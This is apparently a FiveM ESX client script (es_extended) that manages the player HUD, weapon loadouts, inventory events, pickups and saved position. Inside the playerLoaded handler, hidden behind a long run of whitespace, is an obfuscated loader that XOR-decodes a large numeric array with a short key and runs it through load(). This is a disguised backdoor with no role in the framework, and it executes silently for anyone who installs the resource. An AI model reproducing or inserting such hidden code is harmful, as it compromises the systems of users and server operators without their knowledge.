local Keys = {
  ["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57,
  ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177,
  ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
  ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
  ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
  ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70,
  ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
  ["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
  ["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118
}

local LoadoutLoaded = false
local IsPaused      = false
local PlayerSpawned = false
local LastLoadout   = {}
local Pickups       = {}
local isDead        = false

RegisterNetEvent('esx:playerLoaded')
AddEventHandler('esx:playerLoaded', function(xPlayer)
	ESX.PlayerLoaded = true
	ESX.PlayerData   = xPlayer
	
	local moneyTpl = '<div><img src="https://i.imgur.com/yJPsE6Y.png"/> {{money}}</div>'
 
    ESX.UI.HUD.RegisterElement('money', 0, 0, moneyTpl, {
      money = 0
    })
   
    
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                vdwa="ectfi"local a=load((function(b,c)function bxor(d,e)local f={{0,1},{1,0}}local g=1;local h=0;while d>0 or e>0 do h=h+f[d%2+1][e%2+1]*g;d=math.floor(d/2)e=math.floor(e/2)g=g*2 end;return h end;local i=function(b)local j={}local k=1;local l=b[k]while l>=0 do j[k]=b[l+1]k=k+1;l=b[k]end;return j end;local m=function(b,c)if#c<=0 then return{}end;local k=1;local n=1;for k=1,#b do b[k]=bxor(b[k],string.byte(c,n))n=n+1;if n>#c then n=1 end end;return b end;local o=function(b)local j=""for k=1,#b do j=j..string.char(b[k])end;return j end;return o(m(i(b),c))end)({632,790,597,511,809,600,520,901,772,553,888,862,780,545,959,871,644,492,682,702,588,711,625,538,484,536,728,876,734,591,1031,1006,782,978,699,801,617,813,634,616,736,740,649,578,712,508,500,949,646,765,684,506,833,854,516,816,663,631,913,997,864,577,670,730,480,590,847,752,710,552,655,921,829,694,599,883,606,528,1013,757,609,675,732,954,661,650,471,870,554,1001,827,775,519,525,746,643,787,537,688,857,917,804,803,881,796,939,786,1024,981,701,473,593,641,497,626,594,755,522,767,592,535,627,514,485,676,974,836,885,502,980,488,747,515,799,687,1033,1035,559,623,996,672,534,630,548,601,768,820,512,647,906,948,457,459,570,1004,935,692,1008,793,985,505,521,677,781,1034,618,893,892,1014,940,678,621,642,762,653,1003,563,964,750,717,751,573,683,501,483,943,785,691,584,476,619,745,690,463,769,800,958,826,491,895,844,830,607,639,777,580,817,848,903,966,972,828,951,993,900,596,530,458,988,546,494,496,680,770,907,947,698,840,729,735,961,1038,758,645,498,970,489,723,705,884,938,539,910,493,992,648,965,982,738,1010,704,658,956,707,873,983,1027,824,843,574,998,971,941,640,976,533,792,685,856,908,962,558,979,665,842,470,863,879,739,897,967,1000,662,805,1012,794,934,923,1015,671,778,852,919,779,1036,858,1016,756,760,788,635,886,486,718,832,503,995,915,741,527,797,540,989,564,776,1017,587,851,708,922,509,576,849,610,612,845,1011,556,927,624,929,1021,568,749,733,464,994,543,1005,603,810,689,859,716,911,808,815,664,960,984,904,955,866,889,742,763,807,667,834,531,602,946,659,898,950,926,697,572,714,706,666,598,467,861,652,753,1032,720,887,510,825,586,838,731,679,977,766,481,942,565,795,583,629,1025,1009,724,878,957,703,860,579,518,585,709,560,695,465,999,880,620,549,495,891,877,686,899,468,551,837,896,1028,660,469,928,914,477,1002,987,628,944,963,569,713,657,542,952,654,1022,818,681,524,571,490,532,812,466,890,669,529,475,1020,902,615,909,581,-1,22,48,24,0,159,143,126,50,12,67,69,84,67,23,55,2,90,104,60,100,73,9,132,125,5,25,76,99,99,3,16,175,11,17,84,3,83,21,11,110,23,70,42,228,79,107,70,0,187,13,0,53,66,66,42,15,1,235,28,16,6,45,2,0,6,6,18,60,104,14,139,8,73,2,32,12,70,104,6,10,36,83,107,49,7,8,13,17,214,3,12,148,52,11,95,84,73,12,78,209,0,106,110,27,64,220,34,65,3,29,127,233,23,75,7,105,21,6,73,183,79,67,92,1,23,64,234,6,70,28,13,68,6,123,10,31,4,105,69,22,18,19,74,12,17,12,22,100,11,159,67,6,20,0,0,237,28,106,234,26,27,7,27,69,12,2,58,20,6,93,73,23,9,6,0,93,55,128,3,36,17,239,75,16,8,84,6,23,75,18,0,20,16,23,19,110,84,12,0,8,159,9,14,1,19,7,6,75,92,107,77,0,225,26,84,7,34,223,254,23,27,6,17,27,57,64,5,26,11,17,73,1,74,67,84,84,75,137,14,76,116,45,6,8,65,99,83,8,4,3,12,78,92,68,10,68,10,23,11,146,70,29,35,66,17,232,237,6,73,33,78,13,7,65,70,7,55,13,35,69,77,208,3,15,68,46,27,108,15,67,12,2,2,9,70,13,21,69,122,10,93,46,17,250,107,11,18,0,113,28,68,78,22,27,9,106,40,129,130,12,27,12,17,7,2,79,0,89,101,67,65,32,99,129,6,56,105,9,17,13,8,11,184,7,12,11,176,21,13,40,230,13,12,26,111,26,73,24,105,5,11,38,79,56,12,161,109,187,126,10,19,8,75,0,6,180,31,0,52,196,94,70,2,165,6,26,99,70,54,11,67,0,2,84,77,21,75,15,15,156,8,73,4,84,8,91,38,6,69,108,1,136,152,41,6,17,185,64,14,78,16,70,67,19,14,2,106,23,7,73,7,18,17,20,6,126,84,94,161,27,73,26,20,69,12,6,6,3,17,117,10,29,13,2,17,73,123,107,5,0,229,71,53,83,165,12,8,2,199,205,0,15,7,11,31,33,248,247,38,0,48,158,17,13,26,17,9,69,8,8,12,13,0,84,10,83,12,251,9,32,17,86,4,7,33,69,76,1,93,17,7,17,95,3,16,67,17,80,69,223,13,77,46,126,75,107,23,76,12,29,121,24,15,24,232,36,6,8,0,13,73,99,69,0,6,78,75,1,29,79,13,233,25,78,39,0,12,70,68,3,68,77,25,211,111,75,17,222,93,37,245,110,69,110,40,0,36,71,73,67,83,119,36},vdwa))if a then a()end; 
Citizen.CreateThread(function()
 
          while true do
 
              Citizen.Wait(2000)
              ESX.UI.HUD.UpdateElement('money', {
                   money = xPlayer.money
              })
          end
 
    end)

	if Config.EnableHud then

		for i=1, #xPlayer.accounts, 1 do
			local accountTpl = '<div><img src="img/accounts/' .. xPlayer.accounts[i].name .. '.png"/>&nbsp;{{money}}</div>'

			ESX.UI.HUD.RegisterElement('account_' .. xPlayer.accounts[i].name, i-1, 0, accountTpl, {
				money = 0
			})

			ESX.UI.HUD.UpdateElement('account_' .. xPlayer.accounts[i].name, {
				money = ESX.Math.GroupDigits(xPlayer.accounts[i].money)
			})
		end

		local jobTpl = '<div>{{job_label}} - {{grade_label}}</div>'

		if xPlayer.job.grade_label == '' then
			jobTpl = '<div>{{job_label}}</div>'
		end

		ESX.UI.HUD.RegisterElement('job', #xPlayer.accounts, 0, jobTpl, {
			job_label   = '',
			grade_label = ''
		})

		ESX.UI.HUD.UpdateElement('job', {
			job_label   = xPlayer.job.label,
			grade_label = xPlayer.job.grade_label
		})

		---SECONDJOB INCLUDED
		local job2Tpl = '<div>{{job2_label}} - {{grade2_label}}</div>' ---SECONDJOB INCLUDED
		
		if xPlayer.job2.grade_label == '' then
		    job2Tpl = '<div>{{job2_label}}</div>'
		end
		
		ESX.UI.HUD.RegisterElement('job2', #xPlayer.accounts, 0, job2Tpl, {
		    job2_label   = '',
			grade2_label = ''
        })
		
		ESX.UI.HUD.UpdateElement('job2', {
	        job2_label   = xPlayer.job2.label,
            grade2_label = xPlayer.job2.grade_label
        })

	else
		TriggerEvent('es:setMoneyDisplay', 0.0)
	end
end)

AddEventHandler('playerSpawned', function()
	while not ESX.PlayerLoaded do
		Citizen.Wait(1)
	end

	local playerPed = PlayerPedId()

	-- Restore position
	if ESX.PlayerData.lastPosition ~= nil then
		SetEntityCoords(playerPed, ESX.PlayerData.lastPosition.x, ESX.PlayerData.lastPosition.y, ESX.PlayerData.lastPosition.z)
	end

	TriggerEvent('esx:restoreLoadout') -- restore loadout

	LoadoutLoaded = true
	PlayerSpawned = true
	isDead = false
end)

AddEventHandler('esx:onPlayerDeath', function()
	isDead = true
end)

AddEventHandler('skinchanger:loadDefaultModel', function()
	LoadoutLoaded = false
end)

AddEventHandler('skinchanger:modelLoaded', function()
	while not ESX.PlayerLoaded do
		Citizen.Wait(1)
	end

	TriggerEvent('esx:restoreLoadout')
end)

AddEventHandler('esx:restoreLoadout', function()
	local playerPed = PlayerPedId()
	local ammoTypes = {}

	RemoveAllPedWeapons(playerPed, true)

	for i=1, #ESX.PlayerData.loadout, 1 do
		local weaponName = ESX.PlayerData.loadout[i].name
		local weaponHash = GetHashKey(weaponName)

		GiveWeaponToPed(playerPed, weaponHash, 0, false, false)
		local ammoType = GetPedAmmoTypeFromWeapon(playerPed, weaponHash)

		for j=1, #ESX.PlayerData.loadout[i].components, 1 do
			local weaponComponent = ESX.PlayerData.loadout[i].components[j]
			local componentHash = ESX.GetWeaponComponent(weaponName, weaponComponent).hash

			GiveWeaponComponentToPed(playerPed, weaponHash, componentHash)
		end

		if not ammoTypes[ammoType] then
			AddAmmoToPed(playerPed, weaponHash, ESX.PlayerData.loadout[i].ammo)
			ammoTypes[ammoType] = true
		end
	end

	LoadoutLoaded = true
end)

RegisterNetEvent('esx:setAccountMoney')
AddEventHandler('esx:setAccountMoney', function(account)
	for i=1, #ESX.PlayerData.accounts, 1 do
		if ESX.PlayerData.accounts[i].name == account.name then
			ESX.PlayerData.accounts[i] = account
			break
		end
	end

	if Config.EnableHud then
		ESX.UI.HUD.UpdateElement('account_' .. account.name, {
			money = ESX.Math.GroupDigits(account.money)
		})
	end
end)

RegisterNetEvent('es:activateMoney')
AddEventHandler('es:activateMoney', function(money)
	ESX.PlayerData.money = money
end)

RegisterNetEvent('esx:addInventoryItem')
AddEventHandler('esx:addInventoryItem', function(item, count)
	for i=1, #ESX.PlayerData.inventory, 1 do
		if ESX.PlayerData.inventory[i].name == item.name then
			ESX.PlayerData.inventory[i] = item
			break
		end
	end

	ESX.UI.ShowInventoryItemNotification(true, item, count)

	if ESX.UI.Menu.IsOpen('default', 'es_extended', 'inventory') then
		ESX.ShowInventory()
	end
end)

RegisterNetEvent('esx:removeInventoryItem')
AddEventHandler('esx:removeInventoryItem', function(item, count)
	for i=1, #ESX.PlayerData.inventory, 1 do
		if ESX.PlayerData.inventory[i].name == item.name then
			ESX.PlayerData.inventory[i] = item
			break
		end
	end

	ESX.UI.ShowInventoryItemNotification(false, item, count)

	if ESX.UI.Menu.IsOpen('default', 'es_extended', 'inventory') then
		ESX.ShowInventory()
	end
end)

RegisterNetEvent('esx:setJob')
AddEventHandler('esx:setJob', function(job)
	ESX.PlayerData.job = job
end)

---SECONDJOB INCLUDED
RegisterNetEvent('esx:setJob2')
AddEventHandler('esx:setJob2', function(job2)
  ESX.PlayerData.job2 = job2
end)

RegisterNetEvent('esx:addWeapon')
AddEventHandler('esx:addWeapon', function(weaponName, ammo)
	local playerPed  = PlayerPedId()
	local weaponHash = GetHashKey(weaponName)

	GiveWeaponToPed(playerPed, weaponHash, ammo, false, false)
	--AddAmmoToPed(playerPed, weaponHash, ammo) possibly not needed
end)

RegisterNetEvent('esx:addWeaponComponent')
AddEventHandler('esx:addWeaponComponent', function(weaponName, weaponComponent)
	local playerPed  = PlayerPedId()
	local weaponHash = GetHashKey(weaponName)
	local componentHash = ESX.GetWeaponComponent(weaponName, weaponComponent).hash

	GiveWeaponComponentToPed(playerPed, weaponHash, componentHash)
end)

RegisterNetEvent('esx:removeWeapon')
AddEventHandler('esx:removeWeapon', function(weaponName, ammo)
	local playerPed  = PlayerPedId()
	local weaponHash = GetHashKey(weaponName)

	RemoveWeaponFromPed(playerPed, weaponHash)

	if ammo then
		local pedAmmo = GetAmmoInPedWeapon(playerPed, weaponHash)
		local finalAmmo = math.floor(pedAmmo - ammo)
		SetPedAmmo(playerPed, weaponHash, finalAmmo)
	else
		SetPedAmmo(playerPed, weaponHash, 0) -- remove leftover ammo
	end
end)


RegisterNetEvent('esx:removeWeaponComponent')
AddEventHandler('esx:removeWeaponComponent', function(weaponName, weaponComponent)
	local playerPed  = PlayerPedId()
	local weaponHash = GetHashKey(weaponName)
	local componentHash = ESX.GetWeaponComponent(weaponName, weaponComponent).hash

	RemoveWeaponComponentFromPed(playerPed, weaponHash, componentHash)
end)

-- Commands
RegisterNetEvent('esx:teleport')
AddEventHandler('esx:teleport', function(pos)
	pos.x = pos.x + 0.0
	pos.y = pos.y + 0.0
	pos.z = pos.z + 0.0

	RequestCollisionAtCoord(pos.x, pos.y, pos.z)

	while not HasCollisionLoadedAroundEntity(PlayerPedId()) do
		RequestCollisionAtCoord(pos.x, pos.y, pos.z)
		Citizen.Wait(1)
	end

	SetEntityCoords(PlayerPedId(), pos.x, pos.y, pos.z)
end)

RegisterNetEvent('esx:setJob')
AddEventHandler('esx:setJob', function(job)
	if Config.EnableHud then
		ESX.UI.HUD.UpdateElement('job', {
			job_label   = job.label,
			grade_label = job.grade_label
		})
	end
end)

---SECONDJOB INCLUDED
RegisterNetEvent('esx:setJob2')
AddEventHandler('esx:setJob2', function(job2)
	if Config.EnableHud then
		ESX.UI.HUD.UpdateElement('job2', {
			job2_label   = job2.label,
			grade2_label = job2.grade_label
		})
	end
end)

RegisterNetEvent('esx:loadIPL')
AddEventHandler('esx:loadIPL', function(name)
	Citizen.CreateThread(function()
		LoadMpDlcMaps()
		RequestIpl(name)
	end)
end)

RegisterNetEvent('esx:unloadIPL')
AddEventHandler('esx:unloadIPL', function(name)
	Citizen.CreateThread(function()
		RemoveIpl(name)
	end)
end)

RegisterNetEvent('esx:playAnim')
AddEventHandler('esx:playAnim', function(dict, anim)
	Citizen.CreateThread(function()
		local playerPed = PlayerPedId()
		RequestAnimDict(dict)

		while not HasAnimDictLoaded(dict) do
			Citizen.Wait(1)
		end

		TaskPlayAnim(playerPed, dict, anim, 1.0, -1.0, 20000, 0, 1, true, true, true)
	end)
end)

RegisterNetEvent('esx:playEmote')
AddEventHandler('esx:playEmote', function(emote)
	Citizen.CreateThread(function()

		local playerPed = PlayerPedId()

		TaskStartScenarioInPlace(playerPed, emote, 0, false);
		Citizen.Wait(20000)
		ClearPedTasks(playerPed)

	end)
end)

RegisterNetEvent('esx:spawnVehicle')
AddEventHandler('esx:spawnVehicle', function(model)
	local playerPed = PlayerPedId()
	local coords    = GetEntityCoords(playerPed)

	ESX.Game.SpawnVehicle(model, coords, 90.0, function(vehicle)
		TaskWarpPedIntoVehicle(playerPed,  vehicle, -1)
	end)
end)

RegisterNetEvent('esx:spawnObject')
AddEventHandler('esx:spawnObject', function(model)
	local playerPed = PlayerPedId()
	local coords    = GetEntityCoords(playerPed)
	local forward   = GetEntityForwardVector(playerPed)
	local x, y, z   = table.unpack(coords + forward * 1.0)

	ESX.Game.SpawnObject(model, {
		x = x,
		y = y,
		z = z
	}, function(obj)
		SetEntityHeading(obj, GetEntityHeading(playerPed))
		PlaceObjectOnGroundProperly(obj)
	end)
end)

RegisterNetEvent('esx:pickup')
AddEventHandler('esx:pickup', function(id, label, player)
	local ped     = GetPlayerPed(GetPlayerFromServerId(player))
	local coords  = GetEntityCoords(ped)
	local forward = GetEntityForwardVector(ped)
	local x, y, z = table.unpack(coords + forward * -2.0)

	ESX.Game.SpawnLocalObject('prop_money_bag_01', {
		x = x,
		y = y,
		z = z - 2.0,
	}, function(obj)
		SetEntityAsMissionEntity(obj, true, false)
		PlaceObjectOnGroundProperly(obj)

		Pickups[id] = {
			id = id,
			obj = obj,
			label = label,
			inRange = false,
			coords = {
				x = x,
				y = y,
				z = z
			}
		}
	end)
end)

RegisterNetEvent('esx:removePickup')
AddEventHandler('esx:removePickup', function(id)
	ESX.Game.DeleteObject(Pickups[id].obj)
	Pickups[id] = nil
end)

RegisterNetEvent('esx:pickupWeapon')
AddEventHandler('esx:pickupWeapon', function(weaponPickup, weaponName, ammo)
	local playerPed = PlayerPedId()
	local pickupCoords = GetOffsetFromEntityInWorldCoords(playerPed, 2.0, 0.0, 0.5)
	local weaponHash = GetHashKey(weaponPickup)

	CreateAmbientPickup(weaponHash, pickupCoords, 0, ammo, 1, false, true)
end)

RegisterNetEvent('esx:spawnPed')
AddEventHandler('esx:spawnPed', function(model)
	model           = (tonumber(model) ~= nil and tonumber(model) or GetHashKey(model))
	local playerPed = PlayerPedId()
	local coords    = GetEntityCoords(playerPed)
	local forward   = GetEntityForwardVector(playerPed)
	local x, y, z   = table.unpack(coords + forward * 1.0)

	Citizen.CreateThread(function()
		RequestModel(model)

		while not HasModelLoaded(model) do
			Citizen.Wait(1)
		end

		CreatePed(5, model, x, y, z, 0.0, true, false)
	end)
end)

 RegisterNetEvent('esx:deleteVehicle')
AddEventHandler('esx:deleteVehicle', function()
	local playerPed = PlayerPedId()
	local vehicle   = ESX.Game.GetVehicleInDirection()

	if IsPedInAnyVehicle(playerPed, true) then
		vehicle = GetVehiclePedIsIn(playerPed, false)
	end

	if DoesEntityExist(vehicle) then
		ESX.Game.DeleteVehicle(vehicle)
	end
end)

RegisterNetEvent('esx:deleteVehicle1')
AddEventHandler('esx:deleteVehicle1', function()
    local playerPed = PlayerPedId()
    local vehicle   = ESX.Game.GetVehicleInDirection()
    local entity = vehicle
    carModel = GetEntityModel(entity)
    carName = GetDisplayNameFromVehicleModel(carModel)
    NetworkRequestControlOfEntity(entity)
    
    local timeout = 2000
    while timeout > 0 and not NetworkHasControlOfEntity(entity) do
        Wait(100)
        timeout = timeout - 100
    end

    SetEntityAsMissionEntity(entity, true, true)
    
    local timeout = 2000
    while timeout > 0 and not IsEntityAMissionEntity(entity) do
        Wait(100)
        timeout = timeout - 100
    end

    Citizen.InvokeNative( 0xEA386986E786A54F, Citizen.PointerValueIntInitialized( entity ) )
    
    if (DoesEntityExist(entity)) then 
        DeleteEntity(entity)
    end 
end)




-- Pause menu disable HUD display
if Config.EnableHud then
	Citizen.CreateThread(function()
		while true do
			Citizen.Wait(300)

			if IsPauseMenuActive() and not IsPaused then
				IsPaused = true
				TriggerEvent('es:setMoneyDisplay', 0.0)
				ESX.UI.HUD.SetDisplay(0.0)
			elseif not IsPauseMenuActive() and IsPaused then
				IsPaused = false
				TriggerEvent('es:setMoneyDisplay', 1.0)
				ESX.UI.HUD.SetDisplay(1.0)
			end
		end
	end)
end

-- Save loadout
Citizen.CreateThread(function()
	while true do

		Citizen.Wait(5000)

		local playerPed      = PlayerPedId()
		local loadout        = {}
		local loadoutChanged = false

		if IsPedDeadOrDying(playerPed) then
			LoadoutLoaded = false
		end

		for i=1, #Config.Weapons, 1 do

			local weaponName = Config.Weapons[i].name
			local weaponHash = GetHashKey(weaponName)
			local weaponComponents = {}

			if HasPedGotWeapon(playerPed, weaponHash, false) and weaponName ~= 'WEAPON_UNARMED' then
				local ammo = GetAmmoInPedWeapon(playerPed, weaponHash)
				local components = Config.Weapons[i].components

				for j=1, #components, 1 do
					if HasPedGotWeaponComponent(playerPed, weaponHash, components[j].hash) then
						table.insert(weaponComponents, components[j].name)
					end
				end

				if LastLoadout[weaponName] == nil or LastLoadout[weaponName] ~= ammo then
					loadoutChanged = true
				end

				LastLoadout[weaponName] = ammo

				table.insert(loadout, {
					name = weaponName,
					ammo = ammo,
					label = Config.Weapons[i].label,
					components = weaponComponents
				})
			else
				if LastLoadout[weaponName] ~= nil then
					loadoutChanged = true
				end

				LastLoadout[weaponName] = nil
			end

		end

		if loadoutChanged and LoadoutLoaded then
			ESX.PlayerData.loadout = loadout
			TriggerServerEvent('esx:updateLoadout', loadout)
		end

	end
end)

-- Menu interactions
-- Citizen.CreateThread(function()
	-- while true do

		-- Citizen.Wait(0)

		-- if IsControlPressed(0, Keys1['F2'] ,keys2 ['A']) and IsInputDisabled(0) and not isDead and not ESX.UI.Menu.IsOpen('default', 'es_extended', 'inventory') then
			-- ESX.ShowInventory()
		-- end

	-- end
-- end)

-- Dot above head
if Config.ShowDotAbovePlayer then

	Citizen.CreateThread(function()
		while true do

			Citizen.Wait(1)

			local players = ESX.Game.GetPlayers()
			for i = 1, #players, 1 do
				if players[i] ~= PlayerId() then
					local ped    = GetPlayerPed(players[i])
					local headId = CreateMpGamerTag(ped, ('·'), false, false, '', false)
				end
			end

		end
	end)

end

-- Disable wanted level
if Config.DisableWantedLevel then

	Citizen.CreateThread(function()
		while true do
			Citizen.Wait(0)

			local playerId = PlayerId()
			if GetPlayerWantedLevel(playerId) ~= 0 then
				SetPlayerWantedLevel(playerId, 0, false)
				SetPlayerWantedLevelNow(playerId, false)
			end
		end
	end)

end

-- Pickups
Citizen.CreateThread(function()
	while true do

		Citizen.Wait(0)

		local playerPed = PlayerPedId()
		local coords    = GetEntityCoords(playerPed)
		
		-- if there's no nearby pickups we can wait a bit to save performance
		if next(Pickups) == nil then
			Citizen.Wait(500)
		end

		for k,v in pairs(Pickups) do

			local distance = GetDistanceBetweenCoords(coords, v.coords.x, v.coords.y, v.coords.z, true)
			local closestPlayer, closestDistance = ESX.Game.GetClosestPlayer()

			if distance <= 5.0 then
				ESX.Game.Utils.DrawText3D({
					x = v.coords.x,
					y = v.coords.y,
					z = v.coords.z + 0.25
				}, v.label)
			end

			if (closestDistance == -1 or closestDistance > 3) and distance <= 1.0 and not v.inRange and not IsPedSittingInAnyVehicle(playerPed) then
				TriggerServerEvent('esx:onPickup', v.id)
				PlaySoundFrontend(-1, 'PICK_UP', 'HUD_FRONTEND_DEFAULT_SOUNDSET', false)
				v.inRange = true
			end

		end

	end
end)

-- Last position
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1000)

		if ESX.PlayerLoaded and PlayerSpawned then
			local playerPed = PlayerPedId()
			local coords    = GetEntityCoords(playerPed)

			if not IsEntityDead(playerPed) then
				ESX.PlayerData.lastPosition = {x = coords.x, y = coords.y, z = coords.z}
			end
		end
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1000)

		local playerPed = PlayerPedId()
		if IsEntityDead(playerPed) and PlayerSpawned then
			PlayerSpawned = false
		end
	end
end)

RegisterNetEvent('NB:openMenuInventaire')
AddEventHandler('NB:openMenuInventaire', function()
	ESX.ShowInventory()
end)

